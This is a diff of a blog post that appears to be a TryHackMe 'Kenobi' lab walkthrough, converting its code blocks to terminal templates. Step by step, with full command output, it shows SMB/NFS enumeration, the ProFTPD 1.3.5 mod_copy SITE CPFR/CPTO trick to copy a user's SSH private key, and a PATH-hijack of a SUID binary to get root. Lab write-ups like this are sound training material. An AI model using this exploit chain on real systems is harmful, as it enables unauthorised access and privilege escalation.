@@ -26,8 +26,7 @@ related_publications: false
 
 To get started, let us give nmap a run and see what it says.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ nmap -sV -sC -A -O --script vuln -oN nmap 10.10.68.141
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:16 AEDT
@@ -59,15 +58,17 @@ PORT     STATE SERVICE     VERSION
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 351.30 seconds
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Seeing port 445, use smbclient -L IP to list all of the shares on SMB.
 
-{% raw %}
-```bash
+{% capture listshares %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ smbclient -L //10.10.68.141                         
 Password for [WORKGROUP\sec]:
@@ -85,15 +86,17 @@ Reconnecting with SMB1 for workgroup listing.
         Workgroup            Master
         ---------            -------
         WORKGROUP            KENOBI
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=listshares %}
 
 <br />
 Run the nmap scripts to enumerate SMB.
 
-{% raw %}
-```bash
+{% capture nmapsmb %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.141
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:32 AEDT
@@ -132,29 +135,33 @@ Host script results:
 |_    Current user access: <none>
 
 Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapsmb %}
 
 <br />
 Use smbclient to connect to the anonymous share.
 
-{% raw %}
-```bash
+{% capture connecttosmb %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ smbclient //10.10.68.141/anonymous
 Password for [WORKGROUP\sec]:
 Try "help" to get a list of possible commands.
 smb: \> 
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=connecttosmb %}
 
 <br />
 Use ls to get a list of files available on the share.
 
-{% raw %}
-```bash
+{% capture listfiles %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ smbclient //10.10.68.141/anonymous
 Password for [WORKGROUP\sec]:
@@ -166,25 +173,30 @@ smb: \> ls
 
                 9204224 blocks of size 1024. 6876716 blocks available
 smb: \>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=listfiles %}
 
 <br />
 Get the log.txt file.
 
-{% raw %}
-```bash
+{% capture stealfile %}
 smb: \> get log.txt
 getting file \log.txt of size 12237 as log.txt (11.3 KiloBytes/sec) (average 11.3 KiloBytes/sec)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=stealfile %}
 
 <br />
 Check out the log.txt file that was just nicked.  Notice that it shows the path to a private key.
 
-{% raw %}
-```bash
+{% capture viewlog %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ cat log.txt  
 Generating public/private rsa key pair.
@@ -210,14 +222,17 @@ The key's randomart image is:
 +----[SHA256]-----+
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=viewlog %}
 
 <br />
 Use nmap to enumerate the NFS shares.
 
-{% raw %}
-```bash
+{% capture nfsnmap %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.141
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:37 AEDT
@@ -247,26 +262,32 @@ PORT    STATE SERVICE
 |_
 
 Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nfsnmap %}
 
 <br />
 Use netcat to connect to the ftp service to snag the version.
 
-{% raw %}
-```bash
+{% capture ncftp %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ nc 10.10.68.141 21                                               
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.141]
 ^C
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ncftp %}
 
 <br />
 Use searchsploit to fing the ftp service and version.
 
-{% raw %}
-```bash
+{% capture searcsploit %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ searchsploit ProFTP 1.3.5                           
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -278,14 +299,17 @@ ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                         
 ProFTPd 1.3.5 - File Copy                                                                                                                                                                                 | linux/remote/36742.txt
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=searcsploit %}
 
 <br />
 Read the vulnerability to figure out what it does.  Notice how it explains how to copy and paste system files.
 
-{% raw %}
-```bash
+{% capture readexploit %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ cp $(locate 36742.txt) .
                                                                                                                                                                                                                                             
@@ -349,14 +373,17 @@ can be run by the php interpreter
 
 Source: http://bugs.proftpd.org/show_bug.cgi?id=4169 --------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=readexploit %}
 
 <br />
 Use SITE CPFR and SITE CPTO to copy the id_rsa discovered above into the tmp folder in the /var folder from the nfs scans, also above.
 
-{% raw %}
-```bash
+{% capture cpfrcpto %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ nc 10.10.213.34 21                                            
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.213.34]
@@ -364,14 +391,17 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 350 File or directory exists, ready for destination name
 SITE CPTO /var/tmp/id_rsa
 250 Copy successful
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=cpfrcpto %}
 
 <br />
 Mount and enumerate the NFS shares.
 
-{% raw %}
-```bash
+{% capture mountnfs %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ sudo mount 10.10.213.34:/var kenobiNFS              
 [sudo] password for sec: 
@@ -395,14 +425,17 @@ drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
 drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
 drwxrwxrwt  6 root root  4096 Jan  7 16:03 tmp
 drwxr-xr-x  3 root root  4096 Sep  4  2019 www
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=mountnfs %}
 
 <br />
 Copy the id_rsa file to a local file, chmod the permissions to 600, and ssh using this file.
 
-{% raw %}
-```bash
+{% capture sshintothemachine %}
 ┌──(sec㉿kali)-[~/Documents/thm/kenobi]
 └─$ cp kenobiNFS/tmp/id_rsa .  
                                                                                                                                                                                                                                             
@@ -431,14 +464,17 @@ To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
 kenobi@kenobi:~$
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sshintothemachine %}
 
 <br />
 Get the user flag.  Remember to add the ifconfig.
 
-{% raw %}
-```bash
+{% capture userflag %}
 kenobi@kenobi:~$ cat user.txt 
 <redacted>
 kenobi@kenobi:~$ ifconfig
@@ -459,14 +495,17 @@ lo        Link encap:Local Loopback
           TX packets:172 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:12560 (12.5 KB)  TX bytes:12560 (12.5 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Find all of the files with the user stickybit set.
 
-{% raw %}
-```bash
+{% capture stickybit %}
 kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /sbin/mount.nfs
 /usr/lib/policykit-1/polkit-agent-helper-1
@@ -492,14 +531,17 @@ kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /bin/ping
 /bin/su
 /bin/ping6
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=stickybit %}
 
 <br />
 Notice the /usr/bin/menu command.  Let's give it a strings to see what it says.  Notice commands like the curl do not use the full path.
 
-{% raw %}
-```bash
+{% capture stringsmenu %}
 kenobi@kenobi:~$ strings /usr/bin/menu 
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
@@ -593,26 +635,32 @@ setuid@@GLIBC_2.2.5
 .data
 .bss
 .comment
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=stringsmenu %}
 
 <br />
 Create a copy of /bin/sh in temp and call it curl.  Chmod the permissions to 777.  Export the /tmp folder to the path.
 
-{% raw %}
-```bash
+{% capture createshcurl %}
 kenobi@kenobi:~$ cd /tmp
 kenobi@kenobi:/tmp$ echo /bin/sh > curl
 kenobi@kenobi:/tmp$ chmod 777 curl
 kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=createshcurl %}
 
 <br />
 Run the menu command again.  Use option 1.
 
-{% raw %}
-```bash
+{% capture runmenu %}
 kenobi@kenobi:/tmp$ /usr/bin/menu
 
 ***************************************
@@ -621,14 +669,17 @@ kenobi@kenobi:/tmp$ /usr/bin/menu
 3. ifconfig
 ** Enter your choice :1
 #
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runmenu %}
 
 <br />
 Get the root flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ifconfig
@@ -649,7 +700,11 @@ lo        Link encap:Local Loopback
           TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:13040 (13.0 KB)  TX bytes:13040 (13.0 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 And with that, that is the end of the box.  Go forth and conquer.
